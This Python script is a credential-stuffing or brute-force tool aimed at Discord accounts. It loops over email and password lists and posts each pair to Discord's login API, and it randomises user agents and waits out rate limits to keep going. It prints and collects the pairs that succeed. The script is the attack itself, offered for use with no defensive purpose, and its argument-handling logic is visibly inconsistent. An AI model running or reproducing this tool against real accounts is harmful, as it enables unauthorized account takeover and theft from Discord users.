import os
import requests
from fake_useragent import UserAgent
import sys
import time
## proxy
## soon coming multiple sys.argv

succes = []
ua = UserAgent()
def login_file():
    for t in bat:
        for k in has:
            if len(t) == 0 or len(k) == 0:
                continue
            req = requests.Session()
            req.headers.update({"X-Super-Properties": ""})
            req.headers.update({"User-Agent": ua.random})
            req.headers.update({"Content-Type": "application/json"})
            data = '{{"email": "{}", "password": "{}", "undelete": false, "captcha_key": null, "login_source": null, "gift_code_sku_id": null}}'.format(t, k)
            teq = req.post("https://discordapp.com/api/v6/auth/login", data=data)
            time.sleep(0.200)
            if "retry_after" in teq.json():
                laannn = "0." + str(teq.json()['retry_after'])
                time.sleep(float(laannn))
            print("Data:", teq.json())
            print("Email:", t)
            print("Password:", k)
            if "ticket" in teq.json():
                print("-------------------------")
                print("Successful!")
                print("=========>>>><<<<========")
                succes.append(str(t) + ":" + str(k))
            else:
                print("-------------------------")
                print("Fail!")
                print("-------------------------")
    for lan in succes:
        print(str(len(succes)) + " result found!")
        print(lan)
def login_one():
        t = sys.argv[1]
        k = sys.argv[2]
        req = requests.Session()
        req.headers.update({"X-Super-Properties": ""})
        req.headers.update({"User-Agent": ua.random})
        req.headers.update({"Content-Type": "application/json"})
        data = '{{"email": "{}", "password": "{}", "undelete": false, "captcha_key": null, "login_source": null, "gift_code_sku_id": null}}'.format(t, k)
        teq = req.post("https://discordapp.com/api/v6/auth/login", data=data)
        print("Email:", t)
        print("Password:", k)
        if "ticket" in teq.json():
            print("-------------------------")
            print("Successful!")
            print("=========>>>><<<<========")
            succes.append(str(t) + ":" + str(k))
        else:
            print("-------------------------")
            print("Fail!")
            print("-------------------------")
        for lan in succes:
            print(str(len(succes)) + " result found!")
            print(lan)
        exit()
if not os.path.exists(sys.argv[1]):
    bat = sys.argv[1]
if not os.path.exists(sys.argv[2]):
    has = sys.argv[2]
with open(sys.argv[1], "r") as user:
    bat = user.read().splitlines()
with open(sys.argv[2], "r") as password:
    has = password.read().splitlines()
if type(bat) == list and type(has) == list:
    login_file()
if type(bat) != list and type(has) != list:
    raise Exception("Something went wrong!")
if type(bat) != list or type(has) != list:
    login_one()
if type(bat) == list or type(has) == list:
    raise Exception("Something went wrong!")
